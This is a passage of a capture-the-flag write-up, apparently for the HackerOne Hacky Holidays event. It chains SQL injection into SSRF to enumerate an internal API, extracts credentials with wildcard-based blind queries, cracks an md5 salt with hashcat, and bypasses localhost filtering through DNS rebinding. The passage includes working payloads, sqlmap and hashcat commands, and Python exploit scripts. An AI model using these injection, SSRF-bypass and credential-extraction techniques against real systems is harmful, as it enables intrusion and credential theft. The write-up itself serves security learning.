Returns a page with *Grinch API* HTTP status codes description for the different cases. When we are requesting any endpoint in `/api`, the response is `{"error":"This endpoint cannot be visited from this IP address"}`. Adding custom HTTP headers such as `X-Forwarded`, doesn't help, it seems that server validates the physical IP address of the client.

### /uploads

We don't have access to the page, the server returns error 403.

### /picture

Returns a picture, `data` parameter is a base64 encoded string. Let's look at this `data` value for example:
```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

Decoded value is JSON object with two fields: `image` and `auth`: 

```json
{
  "image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg",
  "auth":"bbf295d686bd2af346fcd80c5398de9a"
}
```

`image` is the path to the picture, and the `auth` is some token, which looks like as md5 hash. Maybe there SSRF is possible? What if we can set own file path in `image` and generate `auth` for it? But unfortunately we can't. Looks like that server uses very long salt to generate md5 hash for `image` or maybe it's not md5 hash at all.

### /album

And the last one path returns a page with album name and the pictures related to this album, `hash` parameter is a randomly generated string. I see only one attack that we can try here, it's SQL injection on `hash` parameter. Let's try a simple SQLi:

- `jdh34k' and 1=1 -- .` returns the album page
- `jdh34k' and 1=0 -- .` returns 404 status code!

Good,  there is SQLi, let's run `sqlmap` to dump the database:

```bash
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -p hash --dbms MySQL --dump
```

Well, we see there two tables: *album* and *photo*, but no *users*, *admins*, *passwords*... so the flag is not here :(.

```
Table: album
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Table: photo
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

Let's check how many fields selected in the query, will use *union attack* for that:

- `' and 1=0 union select 1 -- .` - error 404
- `' and 1=0 union select 1,2 -- .` - error 404
- `' and 1=0 union select 1,2,3 -- .` - album page

So the query selects three fields. Let's detect what fields are selected:

- the 1st field is `album.id`, because when we change the value to 1, 2 or 3, the pictures from the different albums are loaded. When the value is 4, no pictures are loaded.
- the 2nd field is unused on the page.
- and the 3rd field is `album.name`.

Now let's imagine how the app selects the data:

1.I suppose there are two SQL queries, in the first one, the album record is selected and filtered by `hash`:
```sql
select * from album
where hash='{hash}'
```

2.In the second one, the photo record is selected and filtered by `album_id`. And `album_id` is used from the previous query.
```sql
select * from photo
where album_id='{album_id}'
```

If my thoughts are correct, then we can inject SQLi inside of SQLi, to select **own** picture path:

- SQLi_2: `' and 1=0 union select 1,2,'our_path' -- .`
- SQLi_1: `' and 1=0 union select SQLi_2,2,3 -- .`

Then the second SQL (which one selects the photos) will be:

```sql
select * from photo
where album_id='' and 1=0 union select 1,2,'our_path' -- 
```

It is impossible to inject the second SQLi as a string, it must be MySQL *hexadecimal literal* string, like as `0xf01a`. Then the initial SQLi for the example above, will be:

```sql
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 -- 
```

Using the information, lets try to get content of the main app page: `/r3c0n_server_4fdk59`, for example. As was described above, the path in `image` looks like: `r3c0n_server_4fdk59/uploads/<picture file name>`, so to get the content of `/r3c0n_server_4fdk59`, the injection path must be `../../` .

1. SQLi_2 as a string: `' and 1=0 union select 1,2,'../../' -- .`
2. SQLi_2 in *hexadecimal literal* string format: `0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20`
3. SQLi_1: `' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 -- `
4. Url: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20and%201=0%20union%20select%200x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3%20--%20`

The server returns the album page with an unloaded image:

{F1138112}

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvIiwiYXV0aCI6ImQyY2I0NDNlZmQxMDQyNDdkYjMzODU4NGY3YjI1MTk5In0=">
```

Decoded string for `data` (as mentioned above it's base64 encoded string) is JSON object `{"image":"r3c0n_server_4fdk59\/uploads\/..\/..\/","auth":"d2cb443efd104247db338584f7b25199"}`. Good, our injection works as expected. So we got SSRF and we can get content of some interesting pages on the server?

Let's open the url from image src:

```
Invalid content type detected
```

Hmm, we expected something different, didn't we? Let's try to get content of other existing pages: https://hackyholidays.h1ctf.com or https://hackyholidays.h1ctf.com/robots.txt. Still the same error! But https://hackyholidays.h1ctf.com/assets/images/grinch-networks.png returns the image. So there is some logic on the server, which validates the response `Content-Type` header, and if it's not equal `image/*`, returns the error. But what the response will be for the not existing page? https://hackyholidays.h1ctf.com/not-existing:

```
Expected HTTP status 200, Received: 404
```

Well, the server validates SSRF response status code and returns it in the own response. Do you remember about `/api` in the app? Let's look again at the Grinch API status codes description:

{F1138111}

Using this table and the text in the response, we can bruteforce wordlist of most popular endpoints and find the valid API endpoints. 

Let's create python script to find API endpoints:

```python
import requests as req
import string
from urllib.parse import urlencode, quote
import re

URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59'

def get_endpoints():
  with open('objects-lowercase.txt', 'r') as f:
    endpoint = f.readline()
    while endpoint:
      endpoint = endpoint.lower().strip()
      res = send_sqli(endpoint)
      if res:
        print('{} => {}, {}'.format(endpoint, res['status_code'], res['text']))
      endpoint = f.readline()

def send_sqli(payload):
  print(payload)
  query = "' and 1=0 union select 1,2,'../api/{}' -- ".format(payload).encode('utf-8').hex()
  params = {
    'hash': "?hash='and 1=0 union select 0x{},2,3 -- ".format(query)
  }
  res = req.get(URL + '/album', params=params)
  match = re.search(r'/picture\?data=([A-Za-z0-9=]+)', res.text)
  if match:
    return call_api(match.group(1))
  print_and_exit('Empty response for ' + payload)

def call_api(data):
  res = req.get(URL + '/picture?data=' + data)
  if (not re.search(r'Received: 404', res.text)):
    return {
      'status_code': res.status_code,
      'text': res.text
    }

def print_and_exit(message):
  print(message)
  exit(0)

get_endpoints()
```

There is only one valid endpoint - `/user`. When we call it without the query parameters, the response is `Invalid content type detected`, but when we call it with any parameter: `/api/user?foo=bar` for example, the response is `Expected HTTP status 200, Received: 400`. This status in Grinch API doc means that we sent invalid GET/POST variable(s). Let's think what parameters can accept `/user` endpoint?

- `id`
- `uuid`
- `login`
- `username`
- `password`
- two parameters

Let's try all of them. When we send two parameters:  `username` and `password`: `/api/user?username=&password=`, the response is `Expected HTTP status 200, Received: 204`. Good, we found the valid parameters. Now let's think how the server uses them  in the `/user` endpoint? I guess it filters users by them. So we can try to guess the both parameters' values, then `/user` endpoint will return status code 200 (select some user), and SSRF response will be `Invalid content type detected` again. Unfortunately  bruteforce attack can't be used here, because we will need to send the millions of requests. SQLi injection doesn't work also. But maybe the server doesn't escape wildcard characters: percentage ` %` and underscore `_` in SQL query? Let's try to send the following path: `/api/user?username=%25&password=%25`, and the response will be `Invalid content type detected`. Cool, that means, that we can use the same technics as we used in the *Evil Quiz* challenge.

Let's create the python script (it uses some functions from the script above):

```python
def get_data():
  known = ''
  known_max_len = 20

  charset = string.ascii_lowercase + string.digits + '_'
  while True:
    found_next = False
    for char in charset:
      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
      tmp_known = known + temp_char

      params = {
        'username': tmp_known + '%',
        'password': '%'
      }
      query = 'user/?{}'.format(urlencode(params, quote_via=quote))

      res = get_data(query)
      if res['text'] == 'Invalid content type detected':
        known += char
        found_next = True
        print(known)
        break
    if (not found_next):
      print_and_exit('Unable to find the next char')
    elif (len(known) == known_max_len):
      print_and_exit('Found the first {} chars: {}'.format(known_max_len, known))
```

It will find that username is `grinchadmin`, and the password is `s4nt4sucks` (btw, nice password:)).

Now, log in by using the found credentials, and there is a flag: 

{F1138114}

- The 11th flag: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`.

# Grinch Network Attack Server

The last app allows us to attack Santa's servers to take them down.

There are three attacks created for us. Attack is launched using the data in `payload` query parameter: `eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. As we see, the value is base64 encoded string. The decode value is JSON object with `target` and `auth` fields: `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`. If target is valid (IPv4 address or Canonical name) and `hash` token is valid for this target, then app launches a new attack. After that, the client uses JSON polling to get the status of attack.

1. `/launch?payload=<base64>`
1. `/launch/<randomly-generated-token>.json`
1. `/launch/<randomly-generated-token>.json?id=<int>`

When attack is finished, we can get the complete log calling  `/launch/<randomly-generated-token>.json` (without `id`):

```json
[
  {"id":"32569","content":"Setting Target Information","goto":false},
  {"id":"32570","content":"Getting Host Information for: 203.0.113.213","goto":false},
  {"id":"32571","content":"Spinning up botnet","goto":false},
  {"id":"32572","content":"Launching attack against: 203.0.113.213 \/ 203.0.113.213","goto":false},
  {"id":"32573","content":"ping 203.0.113.213","goto":false},
  {"id":"32574","content":"64 bytes from 203.0.113.213: icmp_seq=1 ttl=118 time=18.6 ms","goto":false},
  {"id":"32575","content":"64 bytes from 203.0.113.213: icmp_seq=2 ttl=118 time=22.3 ms","goto":false},
  {"id":"32576","content":"64 bytes from 203.0.113.213: icmp_seq=3 ttl=118 time=21.8 ms","goto":false},
  {"id":"32577","content":"Host still up, maybe try again?","goto":false}
]
```

What this attack does? It tries to ping the selected host, and if it's down, returns a link in a `goto` field. Our goal is to take down the Grinch server, so we need to find a way how to send Grinch's host in `target`.

Let's look again at the decoded payload JSON:

```json
{
  "target":"203.0.113.33",
  "hash":"5f2940d65ca4140cc18d0878bc398955"
}
```

`hash` looks like as md5sum. If this is real md5 hash, how it can be generated?

1. `md5sum(target)`
2. `md5sum(target + salt)`
3. `md5sum(salt + target)`

The first statement is wrong, let's check other. We know the encrypted value - `203.0.113.33`, we know the hash -  `5f2940d65ca4140cc18d0878bc398955`, so we need to find a way how to guess `salt`!? For this task we can use, the super fast tool for password recovery - `hashcat`. We will run it with the following parameters:

- `-a 0` - *dictionary attack*, trying all the words in a list
- `-m 10` - *hash mode*, `salt + password`
-  `5f2940d65ca4140cc18d0878bc398955:203.0.113.33` - known hash and password
- `rockyou.txt` - the dictionary file

```bash
$ hashcat -O -m 10 -a 0 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt 
```

A few seconds after the start, `hashcat` will find the `salt` - `mrgrinch463`.

Let's use `mrgrinch463` to generate `auth` token for the localhost (127.0.0.1) `target` and launch the attack against Grinch's host:

- target: `127.0.0.1`
- salt: `mrgrinch463`
- string for encryption: `mrgrinch463127.0.0.1`
- md5sum for `mrgrinch463127.0.0.1`: `3e3f8df1658372edf0214e202acb460b`
- payload: `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`
- payload encoded in base64: `eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==`
- url: `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ%3d%3d`

Hmm, but when we send the request, the log of the attack is:

```json
[
  {"id":"36389","content":"Setting Target Information","goto":false},
  {"id":"36392","content":"Getting Host Information for: 127.0.0.1","goto":false},
  {"id":"36393","content":"Local target detected, aborting attack","goto":false}
]
```

It seems, that the server has some SSRF protection mechanism. Well, IP address can be represented in the dozens of formats, let's try to bypass the server protection using one of them:

- dot notation: `127.0.0.1`
- localhost: `localhost`
- IPv6: `[::1]`
- drop the zeros: `127.0.1`
- drop the zeros: `127.1`
- decimal: `2130706433`
- octal: `017700000001`
- hex: `7f000001`
- hex: `0x7f.0.0.1`

Unfortunately, all of them doesn't work. 

But what about a canonical name? Let's run attack against `hackyholidays.h1ctf.com` target:

```json
[
  {"id":"36293","content":"Setting Target Information","goto":false},
  {"id":"36295","content":"Getting Host Information for: hackyholidays.h1ctf.com","goto":false},
  {"id":"36296","content":"Host resolves to 18.216.153.32","goto":false},
  {"id":"36297","content":"Local target detected, aborting attack","goto":false}
]
```

The response almost the same as above, **but now**, the server resolves the hostname with DNS. What if the server validates IP after DNS resolving and after that pings the original hostname?

There is the type of SSRF attack called *DNS rebinding*. Shortly, this is a method of manipulating resolution of domain names. Let's build our *SSRF DNS rebinding* attack. We need to have hostname that will be resolved to 1.1.1.1 (for example) on the first call to bypass the server SSRF protection, and resolved to 127.0.0.1 every time after that, and we'll attack the Grinch's host.

For this attack we will use [Whonow DNS Server](https://github.com/brannondorsey/whonow) tool, there is already the working server that can do what we need. Build target url `A.1.1.1.1.1time.127.0.0.1.forever.rebind.network`, and let's run attack against it:

```js
[
  {"id":"38456","content":"Setting Target Information","goto":false},
  {"id":"38457","content":"Getting Host Information for: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network","goto":false},
  {"id":"38458","content":"Host resolves to 1.1.1.1","goto":false},
  {"id":"38459","content":"Spinning up botnet","goto":false},
  {"id":"38460","content":"Launching attack against: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network \/ 127.0.0.1","goto":false},
  {"id":"38461","content":"No Response from attack server, retrying...","goto":false},
  {"id":"38462","content":"No Response from attack server, retrying...","goto":false},
  {"id":"38463","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}
]
```

Wow, we got a link in `goto` field, let's open it, and there is the last flag:

{F1138115}

- The 12th flag: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`.

# Conclusion

I would like to say "big thanks" to the organizers and to all the people who helped me, when I have been stuck. It was really fun event:)!

# References

- [gobuster](https://github.com/OJ/gobuster)
- [John the Ripper](https://www.openwall.com/john/)
- [thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [hashcat](https://hashcat.net/hashcat/)
- [rebind.network](https://github.com/brannondorsey/whonow)
- [MD5 conversion and reverse lookup](https://md5.gromweb.com/)
- [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [Scientific notation](https://en.wikipedia.org/wiki/Scientific_notation)
- [SQL injection UNION attacks](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)
- [MySQL Hexadecimal Literals](https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html)
- [MD5 hash with salt](https://www.md5online.org/blog/md5-salt-hash/)
- [Server-Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Hacker0x01 Twitter](https://twitter.com/Hacker0x01)
- [Hacky-Holidays Discord channel](https://discord.com/channels/514337135491416065/787419201148813393)

## Impact

Taking Santa's servers down and canceling Christmas!

## Attachments
- 07-flag.png
- 06-flag.png
- 08-01.png
- 08-flag.png
- 09-flag.png
- 10-flag.png
- 10-s1.png
- 11-01.png
- 11-02.png
- 11-api.png
- 11-flag.png
- 12-flag.png
